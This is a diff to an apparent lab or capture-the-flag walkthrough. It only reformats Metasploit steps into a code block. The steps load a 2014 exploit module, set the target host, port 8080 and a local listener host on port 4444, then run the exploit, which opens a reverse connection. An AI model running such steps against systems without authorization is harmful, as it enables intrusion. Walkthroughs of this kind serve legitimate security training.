@@ -21,9 +21,11 @@ First, we will exploit this using Metasploit. Let's fire it up and search for re
 We will use the 2014 one: `use 1`.
 
 Now let's configure the options `show options` and let's make some changes:
-`set RHOSTS <target IP>`
-`set RPORT 8080`
-`set LHOST <local IP>`
+```
+set RHOSTS <target IP>
+set RPORT 8080
+set LHOST <local IP>
+```
 We can leave the LPORT to 4444
 And finally hit `run` or `exploit`.
 ![](https://github.com/user-attachments/assets/8883396f-88a0-40e4-80b4-1a02c548e4b7)
